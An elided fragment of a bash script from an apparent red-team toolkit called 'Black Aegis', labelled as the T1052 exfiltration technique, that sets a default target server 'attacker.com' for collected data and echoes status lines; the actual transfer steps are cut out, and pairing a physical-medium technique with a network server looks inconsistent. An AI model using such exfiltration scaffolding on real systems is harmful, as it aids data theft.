...
# Technique: T1052 - Exfiltration Over Physical Medium (T1052)
# WARNING: Authorized testing only.

DATA="${1:-/tmp/collected}"
SERVER="${2:-attacker.com}"

echo "[*] Black Aegis - T1052 Exfiltration"
echo "[*] Data: $DATA"
echo "[*] Server: $SERVER"
...
case "T1052" in
    ...
    T1567.001)
        ...
        ;;
    *)
        echo "[+] Exfiltration via Exfiltration Over Physical Medium (T1052)"
